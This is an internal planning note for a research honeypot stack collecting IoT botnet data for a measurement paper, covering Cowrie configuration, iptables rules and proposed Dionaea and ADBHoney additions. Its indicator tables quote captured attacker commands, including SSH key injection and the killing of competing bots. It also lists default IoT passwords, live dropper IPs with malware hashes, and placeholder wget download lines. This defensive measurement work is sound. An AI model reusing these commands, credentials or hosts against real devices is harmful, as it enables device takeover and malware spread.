# Honeypot Stack: Diagnosis, Remediation, and Expansion Plan

**Date**: May 4, 2026  
**Context**: IEEE IoT Journal measurement paper — IOC gap analysis and VPS honeypot improvement  
**Status**: ✅ ACTIVE — IOCs being captured as of Apr 26. userdb.txt fix already applied. 178,518 events across 11 days.

---

## 1. Current State Diagnosis

### 1.1 What You Have Running

**Snapshot as of May 4, 2026 — all rotated log files (Apr 23 – May 3, 11 days)**

| Service    | Port(s)       | Events (11-day) | Unique IPs | Mechanism            |
|------------|---------------|-----------------|------------|----------------------|
| Cowrie     | 22, 23        | 178,518         | 2,077      | SSH/Telnet shell emu |
| Glutton    | catch-all TCP | being ingested  | ~2,014+    | TPROXY banner logger |
| OpenCanary | 21, 25, 8080  | minimal         | minimal    | Protocol alerting    |

**Cowrie IOC breakdown (178,518 total events):**

| Event type                      | Count  | Notes                                        |
|---------------------------------|--------|----------------------------------------------|
| `cowrie.session.connect`        | 57,514 | TCP sessions opened                          |
| `cowrie.session.closed`         | 57,512 | TCP sessions closed                          |
| `cowrie.client.version`         | 15,805 | SSH client banners captured                  |
| `cowrie.login.failed`           | 12,260 | Rejected credentials                         |
| `cowrie.login.success`          | 4,131  | ✅ Accepted credentials (all `root`)          |
| `cowrie.command.input`          | 4,447  | ✅ Shell commands captured                    |
| `cowrie.session.file_download`  | 1,015  | ✅ Malware download events (URL + SHA256)     |
| `cowrie.session.file_upload`    | 104    | ✅ Attacker uploads (binaries pushed to host) |
| `cowrie.command.failed`         | 1,039  | Commands Cowrie couldn't emulate             |
| `cowrie.direct-tcpip.request`   | 76     | Tunnelling attempts                          |

**Events by date (daily volume):**

| Date        | Events  | Notes                                     |
|-------------|---------|-------------------------------------------|
| 2026-04-23  | 104     | Pre-fix baseline (zero logins accepted)   |
| 2026-04-26  | 4,351   | ✅ userdb.txt fix applied — logins begin   |
| 2026-04-27  | 14,761  | Ramp-up as bots discover open shell       |
| 2026-04-28  | 8,017   |                                           |
| 2026-04-29  | 16,030  |                                           |
| 2026-04-30  | 20,077  |                                           |
| 2026-05-01  | 61,367  | Peak day — active campaign wave           |
| 2026-05-02  | 33,449  |                                           |
| 2026-05-03  | 20,362  | Live log at time of pull                  |

### 1.2 What Was Wrong Initially (Now Fixed)

**The original zero-IOC problem** (Apr 23 — 3 days, 104 events, 9 unique IPs):

Cowrie's `userdb.txt` had no weak credentials listed. Automated IoT bots (Mirai variants) attempt `root:root`, `admin:admin`, `root:vizxv`, `root:3245gs5662d34`, etc. When Cowrie rejected all of them, the bot logged "auth failed" and disconnected — no shell session, no commands, no IOCs.

**The fix** was applied around Apr 26 (event volume jumped from 104 on Apr 23 to 4,351 on Apr 26). Weak credentials were added to `userdb.txt`, enabling bots to reach the shell emulation stage.

**Glutton's role (still relevant)**: Glutton is a *banner logger*, not a shell emulator. It correctly handles all non-Cowrie ports. The iptables RETURN rules route ports 22 and 23 to Cowrie, and the rest to Glutton's TPROXY catch-all. This architecture is working as designed.

**Note on boot-time race condition (still an open risk)**: Port 22 exclusion in Glutton is implemented via the `--ssh 22` application flag, not an iptables RETURN rule. If Cowrie crashes and Glutton picks up port 22, traffic silently goes to Glutton (banner only). Monitor `ss -tlnp | grep ':22 '` to confirm `twistd` (Cowrie) owns it, not `glutton`. Belt-and-suspenders fix: add an explicit iptables RETURN rule for port 22 (see Fix 2).

### 1.3 OpenCanary Status

OpenCanary is running on ports 21, 2323, 8080. It logs access attempts with metadata but no command/URL capture. It contributes minimal data to the paper but validates those ports are reachable. Low priority — leave as-is.

---

## 1B. Current IOC Harvest (May 4, 2026)

This section reflects the **actual data** now available in `~/data/raw-logs/cowrie/`.

### Credentials captured

| Metric                       | Count |
|------------------------------|-------|
| Successful logins            | 4,131 |
| Failed login attempts        | 12,260|
| Unique attacker IPs          | 2,077 |
| Successful login username(s) | `root` only |
| Top successful password      | `3245gs5662d34` (935 sessions) — default cred for Hikvision DVRs and Mirai-targeted Chinese ISP routers |
| Other common passwords       | `admin`, `""` (blank), `12345`, `ubuntu`, `password`, `root123` |

### Commands captured (4,447 total)

| Count | Command pattern | Significance |
|-------|-----------------|--------------|
| 1,726 | `uname -s -v -n -r -m` | System fingerprinting — arch/kernel detection before payload selection |
| 980   | `cd ~; chattr -ia .ssh; lockr -ia .ssh` | SSH persistence — remove immutable flag on `.ssh` dir |
| 969   | `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAA..."` | SSH key injection — backdoor lateral movement |
| 41    | `uname -a` | Secondary system check |
| 28    | `cat /proc/cpuinfo \| grep name` | CPU profiling — crypto mining bot targeting |
| 28    | `free -m \| grep Mem` | Memory profiling — mining target selection |
| 28    | `rm -rf /tmp/secure.sh; pkill -9 secure.sh` | Competitor cleanup — kills other bots on same host |

**Top attacker TTP pattern**: fingerprint → inject SSH key → clean up competitors → (download payload)

### Malware downloads captured (1,015 events)

**Campaign A — `176.65.139.177` (7 download sessions)**

| File            | SHA256                                                             | Arch   |
|-----------------|--------------------------------------------------------------------|--------|
| `cat.sh`        | `4cd465ecc8e6022579105e247cef98e5fcc418b84eb5857a642bb179f74ae356` | shell  |
| `iran.x86_64`   | `3164f6882b65bbf58d08919d3ea1b69f00e2757e6e4a8b76e8af1a057ae707cd` | x86_64 |
| `iran.aarch64`  | `9c766990cdd7d73c4a1d8c00e281a05a194f7a3f3ae58629beba202e847696a2` | ARM64  |
| `iran.m68k`     | `c06a2446a9d8680f7ecd2e453daa5472af2dd9a93579b793241de3f861fa7d0b` | m68k   |
| `iran.mips`     | `961082df4ef13fd7cc589ffc7091d2764ca6f5f6f2af0416f4c76b2de1a781ed` | MIPS   |

**Campaign B — `85.11.167.220`**

| File         | SHA256            |
|--------------|-------------------|
| `loader.sh`  | (hash pending — check `cowrie/downloads/`) |

**Top download source IPs:**

| IP               | Sessions | Role                                |
|------------------|----------|-------------------------------------|
| `130.12.180.51`  | 78       | Highest volume — likely C2/loader   |
| `213.209.159.158`| 12       | Secondary campaign                  |
| `102.208.240.251`| 8        |                                     |
| `176.65.139.177` | 7        | "Iran" multi-arch botnet dropper    |

### Paper value of this data

- **RQ2 (attack characterisation)**: ✅ 4,447 commands, 2,077 unique IPs, TTP patterns documented
- **RQ2 (IOC linkage)**: ✅ 6 unique malware URLs + 8 SHA256 hashes → cross-reference against ThreatFox/URLhaus/MalwareBazaar feeds
- **RQ4 (campaign clustering)**: ✅ "Iran" multi-arch campaign (5 ELF variants from single C2) is a direct clustering example
- **RQ4 (SSH key injection campaign)**: ✅ 969 identical commands → coordinated campaign fingerprint



## 2. Cowrie Configuration Fixes

### Fix 1 — Enable Weak Credentials in Cowrie userdb.txt

**Status**: ✅ COMPLETED ~Apr 26, 2026 (evidenced by event volume jump: 104 → 4,351 events on that day)

**Evidence the fix worked**:
- 4,131 successful logins accepted (all `root`)
- Top successful password `3245gs5662d34` — default Hikvision DVR credential, Mirai target
- 4,447 command captures flowing — confirms bots are reaching shell emulation stage

**Commands used (kept for reproducibility)**:

```bash
ssh -i ~/.ssh/research_key -p 8443 cowrie@167.172.187.18
```

Edit `/home/cowrie/cowrie/etc/userdb.txt`:
```bash
cat > /home/cowrie/cowrie/etc/userdb.txt <<'EOF'
# Cowrie userdb — accept weak credentials to capture attacker sessions
# Format: username:UID:password  (UID is ignored, use 0)
# Asterisk (*) as password = accept ANY password for that username
root:0:root
root:0:123456
root:0:password
root:0:admin
root:0:vizxv
root:0:xc3511
root:0:klv123
root:0:7ujMko0admin
root:0:pass
root:0:
admin:0:admin
admin:0:password
admin:0:admin123
admin:0:
guest:0:guest
ubnt:0:ubnt
pi:0:raspberry
support:0:support
user:0:user
EOF
```

Restart Cowrie:
```bash
systemctl restart cowrie
sleep 3
systemctl status cowrie
# Check that port 22 and 23 are still bound:
ss -tlnp | grep ':22\b\|:23\b'
```

Verify credential acceptance is working within 10 minutes by watching the live log:
```bash
tail -f /home/cowrie/cowrie/var/log/cowrie/cowrie.json | python3 -c "
import sys, json
for line in sys.stdin:
    try:
        e = json.loads(line)
        if e.get('eventid','').startswith('cowrie.login'):
            print(e.get('eventid'), e.get('username'), e.get('password'), e.get('src_ip'))
    except: pass
"
```

---

### Fix 2 — Verify Port 22 Is Actually Reaching Cowrie (Not Glutton)

Check that connections to port 22 land on Cowrie (twistd), not Glutton:
```bash
# Must show twistd (Cowrie), NOT glutton
ss -tlnp | grep ':22 '
# Expected:  LISTEN 0 128 0.0.0.0:22  *:*  users:(("twistd",...))

# Watch for SSH connection events in real time
tail -f /home/cowrie/cowrie/var/log/cowrie/cowrie.json | grep '"eventid"'
```

If port 22 shows glutton in `ss` output, the `--ssh 22` exclusion flag is not working. Fix:
```bash
# Add explicit iptables RETURN rule for port 22 (belt-and-suspenders)
iptables -t mangle -I PREROUTING -p tcp --dport 22 -j RETURN
netfilter-persistent save
systemctl restart glutton
```

---

### Fix 3 — Enable Cowrie Telnet on Port 23 and Verify No Conflict

The VPS_SETUP has both Cowrie and Glutton configured for port 23 capture. Check actual state:
```bash
# Who owns port 23?
ss -tlnp | grep ':23 '
```

If Glutton owns port 23 (which handles ~60% of IoT bot Telnet scans), you're losing the highest-value surface. Cowrie should own port 23 — it's listed as a RETURN rule in iptables but verify it's effective:
```bash
iptables -t mangle -L PREROUTING -n --line-numbers | head -20
# Port 23 RETURN rule should appear BEFORE the TPROXY/MARK rule
```

If the RETURN rule for port 23 is AFTER the TPROXY rule, Glutton is intercepting it first. Fix by reinserting at position 1:
```bash
# Find the line number of the existing RETURN rule for port 23
iptables -t mangle -L PREROUTING -n --line-numbers | grep 'dpt:23'
# If it appears after the TPROXY MARK rule, delete and reinsert at position 1
iptables -t mangle -D PREROUTING -p tcp --dport 23 -j RETURN   # delete old
iptables -t mangle -I PREROUTING 1 -p tcp --dport 23 -j RETURN # insert at top
netfilter-persistent save
```

Verify Cowrie has Telnet port 23 in its config:
```bash
grep -A3 '\[telnet\]' /home/cowrie/cowrie/etc/cowrie.cfg
# Should show:
#   enabled = true
#   listen_endpoints = tcp:23:interface=0.0.0.0
```

---

### Fix 4 — Fix logrotate for Log Retention

Default logrotate keeps only 7 days. With the current pull cadence, you risk losing data if you miss a weekly sync.

The log directory is owned by the `cowrie` user (not root), so logrotate needs a `su` directive or it refuses with "insecure permissions".

```bash
# SSH to VPS as root
cat > /etc/logrotate.d/cowrie <<'EOF'
/home/cowrie/cowrie/var/log/cowrie/cowrie.json {
    su cowrie cowrie
    daily
    rotate 90
    compress
    delaycompress
    missingok
    notifempty
    copytruncate
}
EOF

# Also protect Glutton log (root-owned /var/tmp)
cat > /etc/logrotate.d/glutton <<'EOF'
/var/tmp/glutton.log {
    su root root
    daily
    rotate 90
    compress
    delaycompress
    missingok
    notifempty
    copytruncate
}
EOF

logrotate --debug /etc/logrotate.d/cowrie   # should show no errors now
logrotate --debug /etc/logrotate.d/glutton
```

---

## 3. What to Add to the Stack

### 3.1 Dionaea — Malware Binary Collection (HIGH PRIORITY)

**Why Dionaea is critical for the paper**: Every measurement paper that reports malware download URLs and SHA256 hashes (Mirai paper, IoT Inspector, Kolias et al.) used Dionaea or equivalent. Dionaea downloads and stores the actual binary dropped by Mirai/botnet loaders and logs the exact URL used. This is what feeds the `cowrie.session.file_download` pipeline that connects to your feed IOC matching.

**What Dionaea captures that Cowrie does not**:
- Full binary malware samples saved to disk (ELF ARM/MIPS binaries)
- SMB exploit payload capture (EternalBlue variants)
- FTP command sequences for malware delivery
- HTTP-based malware delivery (port 80/8080)
- The *exact* URL the attacker tried to wget

**Ports Dionaea covers** (complement Cowrie, no conflict):
- 80, 8080 — HTTP malware download server emulation
- 21 — FTP (can replace OpenCanary FTP)
- 445 — SMB (EternalBlue / Mirai SMB module)
- 3306 — MySQL (credential harvesting)
- 1433 — MSSQL

**RAM requirement**: ~50–100MB (fits in 1GB VPS with careful config)

**Installation on Ubuntu 24.04**:

> **NOTE**: Dionaea is NOT in Ubuntu 22.04 or 24.04 apt repos — the package was removed from Debian/Ubuntu years ago. `apt install dionaea` will fail with "Unable to locate package". Use Docker instead.

```bash
# Prereq: Docker must be running (it is — Cowrie's DB uses it)
docker pull dinotools/dionaea

# Create dirs for logs and captured binaries
mkdir -p /var/lib/dionaea/{binaries,bistreams,log,rtp} /var/log/dionaea

# Run Dionaea in Docker
docker run -d \
  --name dionaea \
  --restart unless-stopped \
  -p 21:21 \
  -p 80:80 \
  -p 445:445 \
  -p 1433:1433 \
  -p 3306:3306 \
  -v /var/lib/dionaea:/opt/dionaea/var \
  -v /var/log/dionaea:/opt/dionaea/var/log/dionaea \
  dinotools/dionaea

# Verify it's running and logging
docker logs dionaea --tail 20
docker exec dionaea ls /opt/dionaea/var/log/dionaea/

# UFW — open Dionaea ports (if UFW is active)
ufw allow 445/tcp  comment "Dionaea SMB"
ufw allow 3306/tcp comment "Dionaea MySQL"
ufw allow 1433/tcp comment "Dionaea MSSQL"
ufw allow 80/tcp   comment "Dionaea HTTP"
# Port 21: conflicts with OpenCanary FTP — omit or stop OpenCanary FTP first
```

**Check Docker is installed first**:
```bash
docker --version   # must succeed
docker ps          # confirm existing containers (Cowrie DB) are running
```
If Docker is not installed: `apt install -y docker.io && systemctl enable --now docker`

**Conflict with existing services**:
- Port 21: OpenCanary currently claims it — disable OpenCanary FTP or move Dionaea FTP to port 2121
- Port 80: Not currently bound — safe to give to Dionaea
- Port 8080: OpenCanary HTTP — resolve by giving Dionaea port 80 and keeping OpenCanary on 8080

**Add to iptables RETURN rules** (protect from Glutton TPROXY):
```bash
iptables -t mangle -I PREROUTING 1 -p tcp --dport 445  -j RETURN
iptables -t mangle -I PREROUTING 1 -p tcp --dport 3306 -j RETURN
iptables -t mangle -I PREROUTING 1 -p tcp --dport 80   -j RETURN
iptables -t mangle -I PREROUTING 1 -p tcp --dport 1433 -j RETURN
netfilter-persistent save
```

**Log format** — Dionaea writes JSON to `/var/log/dionaea/dionaea-capture.json`. Each entry includes:
```json
{
  "timestamp": "2026-05-04T12:34:56",
  "src_ip": "185.x.x.x",
  "dst_port": 445,
  "protocol": "smbd",
  "url": "http://85.208.x.x/mips.elf",
  "sha256": "a3b4c5...",
  "file_size": 49152
}
```

**Pipeline integration**: Add `pipeline/ingest_dionaea.py` (see §5 below).

---

### 3.2 Cowrie Download Sink — Let Cowrie Actually Download Malware

Cowrie has a built-in download feature (`HoneyPotTransport`) that, when an attacker runs `wget http://x.x.x.x/mips.elf`, Cowrie actually fetches the binary, saves it, and logs the SHA256 hash. This is **already in your Cowrie code** — it just requires:

1. Weak credentials enabled (Fix 1 above — so bots reach the shell stage)
2. Download directory with write permissions:
```bash
mkdir -p /home/cowrie/cowrie/var/lib/cowrie/downloads
chown cowrie:cowrie /home/cowrie/cowrie/var/lib/cowrie/downloads
```
3. Outbound HTTP allowed for the cowrie user (Fix 5 in VPS_SETUP.md Step 5 already does this — verify it's in place):
```bash
iptables -L OUTPUT -n | grep cowrie
# Should show ACCEPT rules for port 80 and 443 for uid cowrie
```

Once credentials are weak and the download dir exists, every `wget` command an attacker types will:
- Log `cowrie.command.input` with the full command
- Trigger `cowrie.session.file_download` with url + sha256
- Save the binary to the downloads dir

---

### 3.3 T-Pot (Optional — Full Stack Replacement)

**What it is**: T-Pot CE (Telekom Security) is a Docker-based all-in-one honeypot platform that runs 20+ honeypots in parallel including Cowrie, Dionaea, Heralding, ADBHoney, and others, all feeding into Elasticsearch + Kibana.

**Why consider it**: Zero configuration friction. Everything works out of the box on a 4GB RAM VPS (~$24/month DigitalOcean). IEEE papers have cited T-Pot deployments for data collection.

**Why NOT for this project**:
- Requires 4GB+ RAM (current VPS is 1GB)
- Kibana/ES overhead is unnecessary — you have a working PostgreSQL pipeline
- You'd lose control over the exact data format flowing into your `pipeline/` code
- Not cost-effective at this stage

**Recommendation**: Stick with manual stack, add Dionaea only.

---

### 3.4 ADBHoney — Android Debug Bridge IoT Trap (MEDIUM PRIORITY)

**Why it matters**: The ADB port (5555/TCP) is one of the top-scanned IoT ports for botnet recruitment (Ares botnet, WireX, Guerrilla). Your UFW already has `ufw allow 5555/tcp`. Adding ADBHoney gives you:
- `adb connect` command capture
- Package download attempts (APK malware)
- Shell command capture (same value as Cowrie but for Android IoT)

**RAM**: ~20MB  
**Install**:
```bash
git clone https://github.com/przemek-ro/adbs-honey.git /opt/adbs-honey
pip3 install -r /opt/adbs-honey/requirements.txt

# OR use the T-Pot standalone adbhoney:
git clone https://github.com/adbhoney/adbhoney.git /opt/adbhoney
cd /opt/adbhoney
python3 adbhoney.py --port 5555 --download-dir /var/lib/adbhoney/ \
    --logfile /var/log/adbhoney.log &
```

**Add RETURN rule**:
```bash
iptables -t mangle -I PREROUTING 1 -p tcp --dport 5555 -j RETURN
netfilter-persistent save
```

---

### 3.5 Heralding — Credential Harvesting on All Remaining Ports

**What it is**: A lightweight honeypot that accepts logins on any port and logs every credential pair attempted. No shell emulation — just credential capture. Useful for RQ2 enrichment.

**Ports to run**: 
- 110 (POP3), 143 (IMAP), 5900 (VNC), 6379 (Redis), 5432 (PostgreSQL)
- Anything Glutton is currently swallowing with no meaningful logging

**RAM**: ~15MB  
**When to add**: After Cowrie + Dionaea are stable and producing IOCs. Not urgent.

---

## 4. Full Revised Port Allocation Map

After implementing Fixes 1–4 and adding Dionaea + ADBHoney:

| Port  | Protocol   | Handler        | Captures                                  |
|-------|------------|----------------|-------------------------------------------|
| 22    | SSH        | **Cowrie**     | Commands, wget URLs, file hashes, creds   |
| 23    | Telnet     | **Cowrie**     | Commands, wget URLs, file hashes, creds   |
| 80    | HTTP       | **Dionaea**    | Malware download URLs, binary + SHA256    |
| 21    | FTP        | **Dionaea**    | FTP malware delivery (replaces OpenCanary)|
| 445   | SMB        | **Dionaea**    | EternalBlue/Mirai SMB payloads            |
| 3306  | MySQL      | **Dionaea**    | Credential harvesting                     |
| 5555  | ADB        | **ADBHoney**   | Android/IoT commands, APK downloads       |
| 8080  | HTTP       | **OpenCanary** | HTTP admin panel access attempts          |
| 25    | SMTP       | **OpenCanary** | SMTP relay attempts                       |
| 2323  | Telnet     | **OpenCanary** | Secondary Telnet (low priority)           |
| 7547  | TR-069     | **Glutton**    | Router CWMP protocol banner               |
| 1883  | MQTT       | **Glutton**    | MQTT connection banner                    |
| 1080  | SOCKS      | **Glutton**    | SOCKS proxy connection (monetization)     |
| 3128  | HTTP proxy | **Glutton**    | Squid/proxy connection (monetization)     |
| 5432  | PostgreSQL | **Glutton**    | DB credential attempts                    |
| 48101 | Mirai C2   | **Glutton**    | Mirai C2 variant connection               |
| *     | ALL others | **Glutton**    | TCP banner + connection metadata          |
| 2222  | SSH (real) | **sshd-admin** | Your own admin access (RETURN, no logging)|

---

## 5. Pipeline Changes Needed

### 5.1 New Ingestor: `pipeline/ingest_dionaea.py`

```python
# Skeleton — to be built after Dionaea is deployed
# Reads /var/log/dionaea/dionaea-capture.json (pulled by rsync)
# Maps to NormalizedEvent schema:
#   source="dionaea", eventid="dionaea.download", url=..., sha256=..., src_ip=...
```

Schema additions needed in `pipeline/schema.py`:
```python
# Add to NormalizedEvent TypedDict:
"download_url":  str | None    # wget/curl URL from honeypot session
"file_sha256":   str | None    # SHA256 of downloaded binary
"file_size":     int | None    # bytes
```

### 5.2 Cowrie IOC Extractor Update: `pipeline/extract_iocs.py`

Once Cowrie starts capturing commands, `extract_iocs.py` must handle:
- `cowrie.session.file_download` → extract `url` field → IOC type `url`
- `cowrie.command.input` → regex extract URLs from command string → IOC type `url`
- `cowrie.command.input` → extract C2 IPs from command string → IOC type `ip`

The existing `extract_iocs.py` already has the scaffolding — it will work automatically once the events start arriving.

### 5.3 Rsync Update: `Makefile` pull-cowrie target

Add Dionaea log to rsync:
```makefile
pull-dionaea:
    @mkdir -p $(LOCAL_DATA)/raw-logs/dionaea
    @rsync -az --quiet \
        -e "$(SSH_OPTS)" \
        root@$(VPS):/var/log/dionaea/ \
        $(LOCAL_DATA)/raw-logs/dionaea/ >> $(LOG_DIR)/sync.log 2>&1
    @printf "Done. Dionaea captures: "; ls $(LOCAL_DATA)/raw-logs/dionaea/*.json 2>/dev/null | wc -l
```

---

## 6. Actual Timeline (Updated)

| Date       | Action/Event                                          | Outcome                                       |
|------------|-------------------------------------------------------|-----------------------------------------------|
| Apr 23     | Cowrie live, userdb.txt not yet fixed                 | 104 events, 0 logins, 0 commands (baseline)   |
| Apr 26     | ✅ userdb.txt fix applied — weak creds added           | 4,351 events, logins begin, commands captured |
| Apr 27     | Bots discover open shell                              | 14,761 events                                 |
| Apr 28–30  | Steady state IOC collection                           | 8k–20k events/day                             |
| May 1      | Peak campaign wave ("iran" multi-arch botnet)         | 61,367 events in one day                      |
| May 2–3    | Continued capture                                     | 33k / 20k events                              |
| **Now**    | 11-day dataset: 178,518 events, 1,015 downloads, 8 hashes | ✅ Sufficient for paper RQ2 characterisation  |

**Next priorities** (not yet done):

| Action                     | Priority | Expected gain                                     |
|----------------------------|----------|---------------------------------------------------|
| Set `rotate 90` logrotate  | High     | Don't lose data — at 20k events/day, default 7-day will overflow |
| Install Dionaea (port 80, 445, 3306) | Medium | Binary captures + SMB payloads for campaign corroboration |
| Install ADBHoney (port 5555) | Low    | ADB commands from Android-based IoT bots          |
| Ingest 178,518 events into PostgreSQL | Now  | Enable feed cross-reference pipeline            |
| Cross-reference 8 hashes vs MalwareBazaar/ThreatFox | Now | Get malware family names for paper |

**Basis for current state**: Cowrie on an internet-exposed VPS with open port 22 and weak credentials received first login within hours of credential enablement. At current volume (~20,000+ events/day), the dataset is already publication-relevant.

---

## 7. Quick Verification Commands (Run After Each Fix)

```bash
# Is Cowrie accepting logins?
grep '"eventid": "cowrie.login.success"' /home/cowrie/cowrie/var/log/cowrie/cowrie.json | tail -5

# Are commands being logged?
grep '"eventid": "cowrie.command.input"' /home/cowrie/cowrie/var/log/cowrie/cowrie.json | tail -5

# Are malware downloads captured?
grep '"eventid": "cowrie.session.file_download"' /home/cowrie/cowrie/var/log/cowrie/cowrie.json | tail -5

# Count today's Cowrie events
today=$(date -u +%Y-%m-%dT)
grep "\"timestamp\": \"$today" /home/cowrie/cowrie/var/log/cowrie/cowrie.json | wc -l

# Port ownership check
ss -tlnp | grep -E ':22 |:23 |:80 |:445 '

# iptables RETURN rules — must precede TPROXY rule (lower line numbers)
iptables -t mangle -L PREROUTING -n --line-numbers

# Dionaea captures (after install)
cat /var/log/dionaea/dionaea-capture.json | python3 -c "
import sys, json
for line in sys.stdin:
    try: print(json.loads(line).get('url',''))
    except: pass
" | sort -u | head -20
```

---

## 8. Paper Impact of Current Data

| Data available now            | RQ addressed | Paper section | Status |
|-------------------------------|-------------|---------------|--------|
| 4,447 shell commands (uname, chattr, SSH key injection) | RQ2 | §4.1 Attacker TTPs | ✅ Ready |
| 6 malware download URLs       | RQ2 | §5.3 URL→feed cross-ref | ✅ Ready |
| 8 unique SHA256 hashes        | RQ2 | §5.4 Malware family lookup | ✅ Cross-ref MalwareBazaar |
| 2,077 unique attacker IPs     | RQ2/RQ4 | §4.2 Geolocation | ✅ Ready |
| "Iran" multi-arch botnet (5 ELF variants, 1 C2 IP) | RQ4 | §5.5 Campaign clustering | ✅ Strong finding |
| SSH key injection campaign (969 identical commands) | RQ4 | §5.5 | ✅ Coordinated campaign fingerprint |
| `3245gs5662d34` credential (935 hits) | RQ1 | §4.1 Device targeting | ✅ Hikvision DVR cred — IoT targeting evidence |

**What is still missing for full paper strength**:

| Gap                           | How to fill                                        |
|-------------------------------|----------------------------------------------------|
| SMB/HTTP malware delivery     | Install Dionaea (ports 80, 445, 3306)              |
| ADB botnet commands           | Install ADBHoney (port 5555)                       |
| Malware family names          | Cross-reference 8 SHA256s against MalwareBazaar API |
| C2 reputation data            | Cross-reference 6 URLs against ThreatFox/URLhaus   |
| Longer longitudinal window    | Fix logrotate to `rotate 90` — don't lose more data |

**Bottom line**: Fix 1 (userdb.txt) is done. The dataset is now publication-relevant. The "zero IOC" risk to the paper is resolved.

---

## 9. Action Checklist

**Completed:**
- [x] SSH to VPS and update `/home/cowrie/cowrie/etc/userdb.txt` with weak credentials (Fix 1)
- [x] Restart Cowrie — confirmed binding port 22/23, accepting sessions
- [x] Cowrie is capturing commands, downloads, and login credentials
- [x] `make pull-cowrie` / `make ingest-honeypot` working — 178,518 events synced locally

**Still needed:**
- [ ] Fix logrotate to `rotate 90` for cowrie and glutton logs on VPS (critical — at 20k events/day, data is being lost)
- [ ] Verify iptables RETURN rule for port 22 exists and precedes TPROXY rule (belt-and-suspenders)
- [ ] Ingest 178,518 events into PostgreSQL: `make ingest-cowrie`
- [ ] Cross-reference 8 SHA256 hashes against MalwareBazaar API
- [ ] Cross-reference 6 download URLs against ThreatFox/URLhaus
- [ ] Install Dionaea on ports 80, 445, 3306 (adds SMB/HTTP malware surface)
- [ ] Add `pull-dionaea` and `ingest-dionaea` targets to Makefile
- [ ] Set `RAPID7_API_KEY` and run `make fetch-sonar` for Shodan/Sonar correlation
- [ ] Install ADBHoney (port 5555) — lower priority
- [ ] Build `pipeline/ingest_dionaea.py` skeleton
- [ ] Update `pipeline/schema.py` with `download_url` and `file_sha256` fields

---

## 10. Honeypot Relevance Assessment Summary

| Honeypot    | Relevant to paper? | Fix needed?        | Gap it fills                             |
|-------------|-------------------|--------------------|------------------------------------------|
| Cowrie      | ✅ YES — critical  | Yes — userdb.txt   | Commands, wget URLs, file hashes (RQ2)   |
| Glutton     | ✅ YES — supporting| No — works as-is   | Attack volume, port sweep coverage       |
| OpenCanary  | ⚠️ Marginal        | No                 | Adds FTP/SMTP/HTTP alerts (minor §4.1)   |
| Dionaea     | ✅ YES — add this  | Install from scratch| Binary capture, SMB, corroboration (RQ2)|
| ADBHoney    | ⚠️ Nice-to-have    | Install from scratch| ADB IoT surface (breadth argument)       |

**Bottom line**: The configuration is not wrong — the honeypot stack is correct in architecture. The single most impactful change is writing 15 lines to `userdb.txt`. Everything else builds on top of that.
